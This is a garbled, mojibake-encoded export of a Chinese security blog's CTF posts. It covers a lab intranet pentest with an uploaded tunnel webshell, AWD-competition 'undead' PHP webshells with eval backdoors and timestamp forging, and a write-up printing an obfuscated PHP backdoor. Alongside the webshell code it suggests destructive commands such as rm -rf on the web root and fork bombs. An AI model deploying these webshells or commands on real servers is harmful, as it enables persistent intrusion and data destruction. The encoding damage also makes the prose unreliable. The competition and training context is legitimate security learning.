<p>æœ‰äº†ç¬¬ä¸€å°ä¸»æœºçš„shellåé¦–å…ˆè¦åšçš„å°±æ˜¯ä¿¡æ¯æ”¶é›†äº†</p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>é¦–å…ˆçœ‹ipï¼Œç½‘æ®µç­‰ä¿¡æ¯<br>ã€‚ã€‚ã€‚<br>ä¸Šæ¥å•¥å‘½ä»¤ç”¨ä¸äº†<br><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-3.png"></p>
<p>é‡åˆ°è¿™ç§æƒ…å†µå¯ä»¥åˆ†ä¸¤ç§æ–¹æ¡ˆç»§ç»­æ“ä½œï¼Œä¸€æ˜¯ææƒï¼ŒäºŒæ˜¯ä¸Šä¼ äºŒè¿›åˆ¶åŒ…ç¼–è¯‘è½¯ä»¶<br>å¯èƒ½æ˜¯æˆ‘å¤ªèœäº†ï¼Œææƒå¤±è´¥ï¼Œæ‰€ä»¥è€ƒè™‘ç¬¬äºŒç§æ–¹æ³•<br>åœ¨<a href="https://nmap.org/download.html">å®˜ç½‘</a>ä¸‹è½½nmapåŒ…ï¼Œä¸Šä¼ å¹¶ç¼–è¯‘</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">bzip2 -<span class="hljs-keyword">cd</span> <span class="hljs-keyword">nmap</span>-<span class="hljs-number">7.92</span>.tar.bz2 | tar xvf -<br><span class="hljs-keyword">cd</span> <span class="hljs-keyword">nmap</span>-<span class="hljs-number">7.92</span><br>./configure<br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure>

<h3 id="å‘ä¸€"><a href="#å‘ä¸€" class="headerlink" title="å‘ä¸€"></a>å‘ä¸€</h3><blockquote>
<p>è¿™é‡Œè¦æ³¨æ„ä¸€ä¸‹ï¼Œç”¨èšå‰‘ç¼–è¯‘nmapä¼šå¤±è´¥ï¼Œå› ä¸ºèšå‰‘çš„shellæ˜¯æŠŠå‘½ä»¤ä¸€ä¸ªä¸ªè¿æ¥èµ·æ¥åœ¨ä¼ è¿‡å»ï¼Œæ‰€ä»¥ç»å¸¸å‡ºé—®é¢˜ï¼Œè¿™é‡Œæ”¹ç”¨å†°è</p>
</blockquote>
<p><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-4.png"></p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>ç¼–è¯‘å®Œåä½¿ç”¨nmapæ‰«æ<br>å…ˆçœ‹è‡ªå·±<br><code>./nmap --iflist</code></p>
<p><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-5.png"></p>
<p>æ‰«ip<br><code>./nmap -sn --min-rate=2000 -n -T5 100.64.0,134-135.0/24</code></p>
<p><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-6.png"></p>
<p>æ‰«ç«¯å£<br><code>./nmap -n -T5 100.64.0,134-135.0/24 --open</code></p>
<p><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-7.png"></p>
<p>æœ€åæ€»ç»“ä¸€ä¸‹</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog">eth0 <span class="hljs-number">100</span>.<span class="hljs-number">64</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>/<span class="hljs-number">24</span><br>eth1 <span class="hljs-number">100</span>.<span class="hljs-number">64</span>.<span class="hljs-number">135</span>.<span class="hljs-number">2</span>/<span class="hljs-number">24</span><br>eth2 <span class="hljs-number">100</span>.<span class="hljs-number">64</span>.<span class="hljs-number">134</span>.<span class="hljs-number">3</span>/<span class="hljs-number">24</span><br><br><br><span class="hljs-number">100.64.0.2</span>               <span class="hljs-number">8000</span>ï¼Œ<span class="hljs-number">9000</span><br><span class="hljs-number">100.64.0.3</span>               <span class="hljs-number">7000</span>ï¼Œ<span class="hljs-number">8000</span><br><span class="hljs-number">100.64.0.4</span>               //è‡ªå·±ï¼Œ<span class="hljs-number">80</span><br><span class="hljs-number">100.64.0.5</span>               <span class="hljs-number">3000</span><br><span class="hljs-number">100.64.134.2</span>             æ— <br><span class="hljs-number">100.64.134.3</span>             //è‡ªå·±ï¼Œ<span class="hljs-number">80</span><br><span class="hljs-number">100.64.135.2</span>             //è‡ªå·±ï¼Œ<span class="hljs-number">80</span><br><span class="hljs-number">100.64.135.3</span>             <span class="hljs-number">3000</span><br></code></pre></td></tr></table></figure>

<p>å› ä¸ºæ˜¯linuxå†…ç½‘ç¯å¢ƒï¼Œæ‰€ä»¥åˆ°è¿™é‡Œä¿¡æ¯æ”¶é›†åŸºæœ¬å°±ç»“æŸäº†<br>å¦‚æœæ˜¯windowså†…ç½‘ï¼Œé‚£ä¹ˆå°±éœ€è¦æ”¶é›†æ›´å¤šçš„ä¿¡æ¯</p>
<h2 id="å»ºç«‹ä»£ç†"><a href="#å»ºç«‹ä»£ç†" class="headerlink" title="å»ºç«‹ä»£ç†"></a>å»ºç«‹ä»£ç†</h2><p>è¿™ä¸€æ­¥æ˜¯æœ€ä¸ºå…³é”®çš„ï¼Œæˆ‘å°±åœ¨è¿™é‡Œå¡äº†å¥½ä¹…æ‰æˆåŠŸ</p>
<p>é¦–å…ˆæˆ‘ä»¬è¦åˆ†æå†…ç½‘é¶æœºçš„å‡ºç½‘çŠ¶æ€</p>
<p>ç»è¿‡æµ‹è¯•å‘ç°é¶æœºä¸å‡ºç½‘ï¼Œä¸”åªå…è®¸httpåè®®è¿›å‡º<br>é‚£ä¹ˆè¿™ç§æƒ…å†µå¯ä»¥é€šè¿‡webshellï¼Œç”¨httpåè®®æ¥ä¼ è¾¾è¯·æ±‚</p>
<p>åœ¨kaliä¸Šä¸‹è½½<a href="https://github.com/sensepost/reGeorg">reGeorg</a>å·¥å…·</p>
<h3 id="å‘äºŒ"><a href="#å‘äºŒ" class="headerlink" title="å‘äºŒ"></a>å‘äºŒ</h3><blockquote>
<p>è¿™é‡Œè¦æ³¨æ„ä¸èƒ½ç”¨æ™®é€šçš„reGeorgï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯å› ä¸ºphpç‰ˆæœ¬ï¼ˆphp8ï¼‰çš„åŸå› ï¼Œæ˜¾ç¤ºçš„çŠ¶æ€æ˜¯è¿æ¥æˆåŠŸï¼Œä½†æ˜¯ä¸€è®¿é—®å°±time outã€‚è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨<a href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a></p>
</blockquote>
<h3 id="é…ç½®ä»£ç†"><a href="#é…ç½®ä»£ç†" class="headerlink" title="é…ç½®ä»£ç†"></a>é…ç½®ä»£ç†</h3><p>ç”Ÿæˆwebshell,<code>-k</code>æ˜¯æŒ‡å®šå¯†ç <br><code>python3 neoreg.py generate -k lewiserii</code></p>
<p><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-8.png"></p>
<p>å°†ç”Ÿæˆçš„<code>./neoreg_servers/tunnel.php</code>ä¼ åˆ°é¶æœºä¸Š</p>
<p>ä½¿ç”¨æœ¬åœ°7777ç«¯å£å»ºç«‹socksè¿æ¥ï¼š<br><code>python3 neoreg.py -k lewiserii -p 7777 -u https://815-a1734091-ce39-4ea5-98a6-f88746398def.do-not-trust.hacking.run/uploadfiles/tunnel.php</code></p>
<p><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-10.png"></p>
<p>ç¼–è¾‘<code>proxychains</code>é…ç½®æ–‡ä»¶<code>/etc/proxychains4.conf</code><br>æœ€åä¸€è¡Œæ·»åŠ <code>socks5  127.0.0.1 7777</code>ï¼Œ7777ä¸ºä½ è‡ªå·±çš„ç«¯å£ï¼Œéœ€è¦ä¸reGeorgä¸­è®¾ç½®çš„ç«¯å£ç›¸åŒ</p>
<p>æ‰€æœ‰å·¥å…·ä½¿ç”¨å‘½ä»¤å‰åŠ <code>proxychains</code>å°±å¯ä»¥ä½¿æµé‡èµ°ä»£ç†</p>
<p>å¯åŠ¨ç«ç‹<br><code>proxychains4 firefox</code><br>é€ä¸ªè®¿é—®åˆšæ‰æ‰«å‡ºæ¥çš„ip<br>æˆåŠŸè®¿é—®å†…ç½‘ä¸»æœºï¼<br><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-11.png"></p>
<h3 id="é…ç½®burpä»£ç†"><a href="#é…ç½®burpä»£ç†" class="headerlink" title="é…ç½®burpä»£ç†"></a>é…ç½®burpä»£ç†</h3><p>æ·»åŠ ä¸€ä¸ªsocksä»£ç†ï¼Œç«¯å£ä¸reGeorgç›‘å¬çš„ç«¯å£ä¸€è‡´<br><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-12.png"></p>
<p>è®¾ç½®ç«ç‹çš„ä»£ç†ä¸burpæŠ“åŒ…çš„ä»£ç†ä¸€è‡´<br><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-13.png"></p>
<p>æˆåŠŸæŠ“åŒ…<br><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-14.png"></p>
<h2 id="ç¬¬äºŒå±‚"><a href="#ç¬¬äºŒå±‚" class="headerlink" title="ç¬¬äºŒå±‚"></a>ç¬¬äºŒå±‚</h2><p>POCç›´æ¥æ‰“å°±è¡Œäº†<br><img src="/img/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-15.png"></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å°èœé¸¡çš„åˆæ¬¡å†…ç½‘ä¹‹æ—…åˆ°è¿™å°±ç»“æŸäº†ï¼Œä¸ªäººæ„Ÿè§‰å†…ç½‘éš¾çš„å°±æ˜¯ä¿¡æ¯æ”¶é›†å’Œå±‚å±‚ä»£ç†ï¼Œå½“ä½ æŒæ¡çš„ä¿¡æ¯è¶Šå¤šå°±è¶Šå¥½æ“ä½œ</p>
]]></content>
      <categories>
        <category>å†…ç½‘</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>AWDä¸æ­»é©¬ä¸å…‹åˆ¶æ–¹æ³•</title>
    <url>/posts/46ef80a/</url>
    <content><![CDATA[<h1 id="ä¸æ­»é©¬"><a href="#ä¸æ­»é©¬" class="headerlink" title="ä¸æ­»é©¬"></a>ä¸æ­»é©¬</h1><p>ä¸€ä¸ªå…¸å‹çš„ä¸æ­»é©¬ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.l.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;56183c1f36ef08fb8b027a4116db8483&quot;)&#123;@eval($_POST[&quot;a&quot;]);&#125; ?&gt;&#x27;</span>;<br>    <span class="hljs-comment">//pass=lewiserii</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .l.php&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">1000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>è§£é‡Šä¸€ä¸‹<br><code>ignore_user_abort(true);</code> å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ï¼Œå³ä½¿ä¸å®¢æˆ·æœºæ–­å¼€è„šæœ¬ä»ä¼šæ‰§è¡Œã€‚<br><code>set_time_limit(0);</code> è®¾ç½®è„šæœ¬æœ€å¤§æ‰§è¡Œæ—¶é—´ï¼Œè¿™é‡Œè®¾ç½®ä¸º0ï¼Œå³æ²¡æœ‰æ—¶é—´æ–¹é¢çš„é™åˆ¶<br><code>unlink(__FILE__);</code> åˆ é™¤æ–‡ä»¶æœ¬èº«ï¼Œä»¥èµ·åˆ°éšè”½è‡ªèº«çš„ä½œç”¨</p>
<p>å½“ä¸Šä¼ å®Œåéœ€è¦è®¿é—®ä¸€æ¬¡ä¸æ­»é©¬ï¼Œç”Ÿæˆä¸€å¥è¯æœ¨é©¬, æ‰èƒ½çœŸæ­£â€ä¸æ­»â€ï¼Œè¿™ç‚¹å¾ˆå¤šæ–°æ‰‹ç¬¬ä¸€æ¬¡ç”¨å¯èƒ½ä¼šå¿½ç•¥ï¼Œè¿˜æœ‰è®°å¾—åˆ é™¤æ³¨é‡Šï¼Œä¸ç„¶å°±ä¼šè¢«å…¶ä»–é˜Ÿä¹Œé¸¦åé£æœº</p>
<p><img src="/img/awd/shell-1.png"></p>
<h1 id="å…‹åˆ¶æ–¹æ³•"><a href="#å…‹åˆ¶æ–¹æ³•" class="headerlink" title="å…‹åˆ¶æ–¹æ³•"></a>å…‹åˆ¶æ–¹æ³•</h1><p>å½“ç„¶ï¼Œä¸æ­»é©¬ä¹Ÿå¹¶éçœŸæ­£æ— æ•Œï¼Œåªæ˜¯åœ¨ä½æƒé™çš„æƒ…å†µä¸‹è¾ƒéš¾å¤„ç†</p>
<h2 id="é«˜æƒé™ä¸‹çš„å¤„ç†æ–¹æ³•ï¼ˆrootï¼‰"><a href="#é«˜æƒé™ä¸‹çš„å¤„ç†æ–¹æ³•ï¼ˆrootï¼‰" class="headerlink" title="é«˜æƒé™ä¸‹çš„å¤„ç†æ–¹æ³•ï¼ˆrootï¼‰"></a>é«˜æƒé™ä¸‹çš„å¤„ç†æ–¹æ³•ï¼ˆrootï¼‰</h2><p>1ï¼šé‡å¯æœåŠ¡ï¼Œæ€æ‰ä¸æ­»é©¬çš„è¿›ç¨‹<br>ubuntuçš„ç”¨serviceï¼Œcentosçš„ç”¨systemctl<br><img src="/img/awd/shell-2.png"></p>
<h2 id="ä½æƒé™ä¸‹çš„å¤„ç†æ–¹æ³•"><a href="#ä½æƒé™ä¸‹çš„å¤„ç†æ–¹æ³•" class="headerlink" title="ä½æƒé™ä¸‹çš„å¤„ç†æ–¹æ³•"></a>ä½æƒé™ä¸‹çš„å¤„ç†æ–¹æ³•</h2><p>ä¸€èˆ¬çš„awdæ¯”èµ›ä¸­åŸºæœ¬ä¸ä¼šæ”¾å‡ºrootï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æƒé™å¾ˆä½ï¼Œæ— æ³•è¿›è¡Œé‡å¯æœåŠ¡ç­‰æ“ä½œ</p>
<p><img src="/img/awd/shell-3.png"></p>
<p>ä¸è¿‡åŠæ³•æ€»æ¯”å›°éš¾å¤š</p>
<p>æ–¹æ³•ä¸€ï¼škillè¿›ç¨‹</p>
<p>è¿™ä¸ªæ–¹æ³•åº”è¯¥æ˜¯ç›®å‰æœ€å¥½çš„è§£å†³æ–¹æ¡ˆäº†ï¼Œæ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæ¯”å¦‚<code>del.php</code>, å†™ä¸Šæ€è¿›ç¨‹çš„å‘½ä»¤ï¼Œè®¿é—®åå³å¯åˆ é™¤ä¸æ­»é©¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">www-data         <span class="hljs-comment">//ä½¿ç”¨çš„æ—¶å€™æ³¨æ„ç”¨æˆ·ä¸ä¸€å®šæ˜¯www-dataï¼Œæ ¹æ®å®é™…æƒ…å†µæ¥</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;kill `ps aux | grep www-data | awk &#x27;&#123;print <span class="hljs-subst">$2</span>&#125;&#x27; | xargs kill -9`&quot;</span>);<br><br>php-fpm        <span class="hljs-comment">//æ€php-fpmè¿›ç¨‹</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;kill `ps -ef | grep php-fpm | grep -v grep | awk &#x27;&#123;print <span class="hljs-subst">$2</span>&#125;&#x27;`&quot;</span>);<br><br>php-apache     <span class="hljs-comment">//æ€httpdè¿›ç¨‹</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;kill `ps -ef | grep httpd | grep -v grep | awk &#x27;&#123;print <span class="hljs-subst">$2</span>&#125;&#x27;`&quot;</span>);<br></code></pre></td></tr></table></figure>

<p><img src="/img/awd/shell-4.png"></p>
<p>æ–¹æ³•äºŒï¼šåˆ›å»ºä¸€ä¸ªå’Œä¸æ­»é©¬ç”Ÿæˆçš„é©¬ä¸€æ ·åå­—çš„ç›®å½•<br>å¯¹è‡ªå·±çš„é˜²å¾¡ä¸æ”¾å¿ƒçš„è¯å¯ä»¥æå‰åˆ›å»ºå‡ ä¸ªå¸¸ç”¨é©¬åå­—çš„æ–‡ä»¶å¤¹ï¼Œæ¯”å¦‚m.phpï¼Œshell.php</p>
<p>ç¼–å†™ä¸€ä¸ªshellè„šæœ¬</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>cd /var/www/html/<br>while true;do rm -rf .l.php;mkdir .l.php;done<br></code></pre></td></tr></table></figure>
<p>æ”¾åœ¨åå°è¿è¡Œï¼Œå®æµ‹ä¸æ˜¯å¾ˆç¨³å®šï¼Œä¸æ¨èä½¿ç”¨</p>
<p><img src="/img/awd/shell-5.png"></p>
<p>æ–¹æ³•ä¸‰ï¼šç«äº‰å†™å…¥æ— æ„ä¹‰çš„ä¸€å¥è¯<br>usleepå€¼æ¯”å¯¹æ–¹é©¬çš„å€¼ä½å°±è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.l.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php echo &quot;lewiserii&quot; ?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-comment">//system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .l.php&#x27;);</span><br>        <span class="hljs-comment">//usleep(1000);</span><br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>


<h1 id="å˜ç§ä¸æ­»é©¬ä¸æ…å±æ£"><a href="#å˜ç§ä¸æ­»é©¬ä¸æ…å±æ£" class="headerlink" title="å˜ç§ä¸æ­»é©¬ä¸æ…å±æ£"></a>å˜ç§ä¸æ­»é©¬ä¸æ…å±æ£</h1><p>å”¯ä¸€çš„åŒºåˆ«æ˜¯æ–‡ä»¶åå‰åŠ äº†ä¸ªçŸ­æ ï¼Œè¿™å°±å¾ˆéªšäº†ï¼Œä¼šä¸å‘½ä»¤çš„å‚æ•°å†²çªè€Œæ— æ³•å¯¹å®ƒæ“ä½œï¼Œä½†æ˜¯æµè§ˆå™¨ä¸­å´å¯ä»¥æ­£å¸¸è§£æ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;-index.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;56183c1f36ef08fb8b027a4116db8483&quot;)&#123;@eval($_POST[&quot;a&quot;]);&#125; ?&gt;&#x27;</span>;<br>    <span class="hljs-comment">//pass=lewiserii</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-comment">//system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; -index.php&#x27;);</span><br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">0</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/awd/shell-6.png"></p>
<p>è¿™ä¸ªåº”è¯¥ç®—æ˜¯æ¯”è¾ƒå†·é—¨çš„çŸ¥è¯†ç‚¹äº†ï¼Œæƒ³è¦æ“ä½œä¹Ÿå¾ˆç®€å•ï¼Œåœ¨æ–‡ä»¶å‰åŠ ä¸Šä¸¤ä¸ª<code>--</code>å°±å¯ä»¥äº†ï¼Œè¡¨ç¤ºè½¬ä¹‰å­—ç¬¦ï¼Œæˆ–è€…å½¢å¦‚<code>./-index.php</code></p>
<blockquote>
<p>æ…å±æ£ï¼šåœ¨ä¸æ­»é©¬ä¸­æ·»åŠ <code>rm -rf /var/www/html/*</code>ï¼›æˆ–è€…åˆ›å»ºå¤§é‡æ— æ„ä¹‰çš„æ–‡ä»¶ï¼›æˆ–è€…åˆ¶ä½œforkç‚¸å¼¹ç­‰ç­‰</p>
</blockquote>
<h2 id="åŠ¨æ€å¯†ç "><a href="#åŠ¨æ€å¯†ç " class="headerlink" title="åŠ¨æ€å¯†ç "></a>åŠ¨æ€å¯†ç </h2><p>phpè·å–SERVER_ADDRçš„å€¼è¿›è¡Œmd5</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;-lewiserii.php&#x27;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>];<br><span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$ip</span>);<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_REQUEST[&quot;pass&quot;])==&quot;&#x27;</span> . <span class="hljs-variable">$pass</span> . <span class="hljs-string">&#x27;&quot;)&#123;@eval($_REQUEST[&quot;cmd&quot;]);&#125; ?&gt;&#x27;</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; ./-lewiserii.php&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">500</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¹Ÿæœ‰ç¼ºç‚¹ï¼Œå› ä¸ºå¯†ç æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œå¾ˆå®¹æ˜“ååº”è¿‡æ¥ç„¶åä¸Šè½¦<br>å…¶å®æ›´å¥½çš„æ–¹å¼æ˜¯åˆ©ç”¨pythonç­‰è„šæœ¬åœ¨æœ¬åœ°åŠ å¯†å®Œå†ä¼ åˆ°é¶æœº</p>
]]></content>
      <categories>
        <category>awd</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>ä¸æ­»é©¬</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€ctfshowã€‘æ‘†çƒ‚æ¯-wp</title>
    <url>/posts/8752bc8/</url>
    <content><![CDATA[<p>æ‘†çƒ‚äº†ï¼Œæ²¡æœ‰<a href="https://qgieod1s9b.feishu.cn/docs/doccnC4EpMhSv1Ni6mbL7BQQdBc">wp</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>2021å°å·å¸‚é¦–å±Šç½‘ç»œå®‰å…¨å¤§èµ›</title>
    <url>/posts/11635d50/</url>
    <content><![CDATA[<p>å–œææ¦œä¸€</p>
<p><img src="/img/wp/2021/2021taizhou-1.png"></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>flagåœ¨è¯·æ±‚å¤´ä¸­<br><img src="/img/wp/2021/2021taizhou-2.png"></p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>æ‰«æç›®å½•å¾—åˆ°åå°è·¯å¾„<code>/admin</code></p>
<p>ç”¨<code>admin</code>ï¼Œ<code>admin888</code>å¼±å£ä»¤è¿›å…¥åå°</p>
<p>åœ¨<code>ç½‘ç«™å®‰å…¨</code>ä¸€æ ä¸­ä½¿ç”¨<code>æ£€æµ‹æœ¨é©¬</code>åŠŸèƒ½ï¼Œå‘ç°åé—¨<br><img src="/img/wp/2021/2021taizhou-3.png"></p>
<p>ä½¿ç”¨æ–‡ä»¶ç®¡ç†åŠŸèƒ½æŸ¥çœ‹æœ¨é©¬æ–‡ä»¶ï¼Œå‘ç°è¢«æ··æ·†äº†<br><img src="/img/wp/2021/2021taizhou-4.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$mt</span>  = <span class="hljs-string">&quot;mFsKCleRfU&quot;</span>;<br><span class="hljs-variable">$ojj</span> = <span class="hljs-string">&quot;IEBleldle&quot;</span>;<br><span class="hljs-variable">$hsa</span> = <span class="hljs-string">&quot;E9TVFsnd2VuJ10p&quot;</span>;<br><span class="hljs-variable">$fnx</span> = <span class="hljs-string">&quot;Ow==&quot;</span>;<br><span class="hljs-variable">$zk</span>  = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;sdtdrd_redpdldadcde&quot;</span> );<br><span class="hljs-variable">$ef</span>  = <span class="hljs-variable">$zk</span>( <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;zbazsze64_zdzeczodze&quot;</span> );<br><span class="hljs-variable">$dva</span> = <span class="hljs-variable">$zk</span>( <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;pcprpepaptpe_fpupnpcptpipopn&quot;</span> );<br><span class="hljs-variable">$zvm</span> = <span class="hljs-variable">$dva</span>( <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$ef</span>( <span class="hljs-variable">$zk</span>( <span class="hljs-string">&quot;le&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$ojj</span> . <span class="hljs-variable">$mt</span> . <span class="hljs-variable">$hsa</span> . <span class="hljs-variable">$fnx</span> ) ) );<br><span class="hljs-variable">$zvm</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

